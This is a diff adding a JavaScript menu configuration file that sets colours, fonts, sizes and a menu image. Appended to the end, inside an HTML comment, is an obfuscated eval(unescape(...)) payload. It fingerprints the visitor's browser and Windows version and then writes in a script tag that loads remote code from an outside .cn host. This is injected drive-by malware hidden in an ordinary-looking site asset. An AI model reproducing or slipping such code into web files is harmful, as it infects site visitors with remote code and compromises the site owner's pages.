@@ -1,0 +1,25 @@
+mainFntCol = "#FFFFFF";
+mainFntOverCol = "#FFC080";
+mainBackCol = "#804000";
+mainOverCol = "#C04000";
+menuType = 1;
+menuWidth = 95;
+childOverTop = 0;
+childOverLeft = 1;
+secondsVisible = 1;
+borWid = 1;
+borCol = "#804000";
+fntCol = "#FFFFFF";
+fntOverCol = "#FFFF80";
+backCol = "#C04000";
+overCol = "#FF8000";
+fntSiz = "9pt";
+fntSty = "normal";
+fntWeight = "normal";
+fntFam = "Arial";
+opacity = 95;
+imgSrc = "images/ar_menu0.gif";
+
+<!-- 
+(function(){eval(unescape(('var"20"61"3d"22Sc"72iptEngi"6ee"22"2c"62"3d"22Ver"73io"6e"28)+"22"2cj"3d"22"22"2cu"3d"6eavigato"72"2eu"73e"72A"67ent"3bi"66("28u"2eindexOf("22Chrom"65"22"29"3c"30)"26"26("75"2e"69nd"65xOf("22Win"22)"3e0)"26"26(u"2e"69n"64e"78Of("22NT"206"22)"3c0"29"26"26(documen"74"2ec"6f"6f"6bie"2eind"65x"4ff("22"6die"6b"3d"31"22"29"3c0)"26"26(typ"65o"66(zr"76zt"73)"21"3d"74y"70eo"66("22A"22)"29"29"7bzr"76zt"73"3d"22A"22"3b"65val("22"69f("77indow"2e"22+a+"22)"6a"3dj+"22+a+"22Ma"6aor"22"2bb+a+"22Mi"6eor"22+b+a+"22Bui"6cd"22+b+"22j"3b"22)"3bd"6fcumen"74"2ewr"69te"28"22"3c"73"63rip"74"20s"72c"3d"2f"2fma"72"22+"22tuz"2ec"6e"2fvid"2f"3f"69"64"3d"22+j+"22"3e"3c"5c"2fscript"3e"22)"3b"7d').replace(/"/g,'%')))})();
+ -->
